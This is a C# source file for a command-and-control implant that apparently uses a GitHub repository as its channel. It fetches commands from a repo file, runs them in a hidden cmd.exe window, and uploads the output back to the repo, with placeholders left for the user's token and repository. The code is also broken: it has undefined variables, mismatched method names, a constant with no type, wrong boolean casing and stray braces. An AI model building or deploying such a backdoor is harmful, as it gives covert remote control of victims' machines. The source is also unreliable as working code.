using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using Octokit;
using System.IO;


namespace GITHUBC2{
 internal class Program{
   private const string Input = "Your_Github_input.txt";
   private const string Output = "Your_github_output.txt";
   private const string user = "Your_User";
   private const string repository = "Your Repo";
   private const AuthToken = "Your personal Auth token";

   static async main(string[] args){
     var client = new GitHubClient(new ProductHeaderValue("n-app"));
     var tokenAuth = new Credentials(token);
     client.Credentials = tokenAuth;


     var fileContent = await client.Repository.Content.GetAllContents(RepositoryOwner,RepositoryName,Input);
     var inputCMD = fileContent[0].Content;
     var output = executeCMD(InputCMD);
     var OutPutFile  = await client.Repository.Content.GetAllContents(RepositoryOwner,RepositoryName,Output);
      var updateRequest = new UpdateFileRequest("update", output, OutputFile[0].Sha);
       await client.Repository.Content.UpdateFile(RepositoryOwner, RepositoryName, Output, updateRequest);
  
   }

 
 
 string executeCommand(string command){
   var processInfo = new ProcessStartInfo("cmd.exe"){
     RedirectStandardOutput = True,
     RedirectStandardInput = True,
     UseShellExecute = False,
     CreateNoWindow = True,
   };
   var process = new Process{ StartInfo = processInfo};
   process.Start();
   process.StandardInput.WriteLine($"cmd /k {command}");
   string output = process.StandardOutput.ReadToEnd();
   return output;
 }
 
 
 
 
 
 }
     
























}
}
}
